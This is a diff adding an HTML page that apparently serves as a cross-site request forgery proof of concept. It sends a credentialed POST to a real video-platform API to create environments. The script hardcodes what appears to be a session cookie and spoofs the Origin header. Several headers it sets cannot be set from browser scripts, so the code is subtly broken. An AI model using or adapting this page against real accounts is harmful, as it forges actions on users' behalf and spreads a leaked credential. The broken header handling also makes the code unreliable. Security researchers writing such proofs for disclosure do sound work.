@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Submit Environment Data</title>
+</head>
+<body>
+
+<h1>Submit Environment Data</h1>
+
+<form id="environmentForm">
+    <label for="name">Name:</label>
+    <input type="text" id="name" name="momboss"><br><br>
+
+    <label for="access">Access:</label>
+    <input type="text" id="access" name="user"><br><br>
+
+    <label for="type">Type:</label>
+    <input type="text" id="type" name="staging"><br><br>
+
+    <input type="button" value="Submit" onclick="submitForm()">
+</form>
+
+<script>
+function submitForm() {
+    // Get the values from the form inputs
+    var name = document.getElementById("name").value;
+    var access = document.getElementById("access").value;
+    var type = document.getElementById("type").value;
+
+    // Create a JavaScript object to match the JSON structure
+    var environmentData = {
+        environment: {
+            name: name,
+            access: access,
+            type: type
+        }
+    };
+
+    // Convert the JavaScript object to JSON
+    var jsonData = JSON.stringify(environmentData);
+
+    // Create a new XMLHttpRequest object
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://api.mux.com/ui/v1/environments", true);
+
+    // Set the request headers
+    xhr.setRequestHeader("Cookie", "_mux_key=8klrp7_muxsession_SFMyNTY.g2gDbQAAAIArZ3hxb1VydHdQRFZGN3ovdXdMWEUwVUV5OHhJTTZSNStXWGJHeUpaNm54Rys0NXUzbnFndU4xMm9CU0VsakRmc0VyRUJlWWhGRHVQSDhpMGNwR3NQdWN1N203aHBuamUwY2R6NlRKYzRVbKhYc3FsM1FJOTlaWWE0c0FQMjZjVG4GALNoB6WLAWIAAVGA.5wZtpKzo6CtU6acGtZmp_Bcy2FuQhvl3s4SqcYQNAj8");
+    xhr.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.setRequestHeader("Content-Length", jsonData.length.toString());
+    xhr.setRequestHeader("Origin", "https://dashboard.mux.com");
+    xhr.withCredentials=true;
+    // Handle the response from the server
+    xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4 && xhr.status === 200) {
+            // Request was successful, you can handle the response here
+            console.log(xhr.responseText);
+        }
+    };
+
+    // Send the JSON data as the request body
+    xhr.send(jsonData);
+}
+</script>
+
+</body>
+</html>
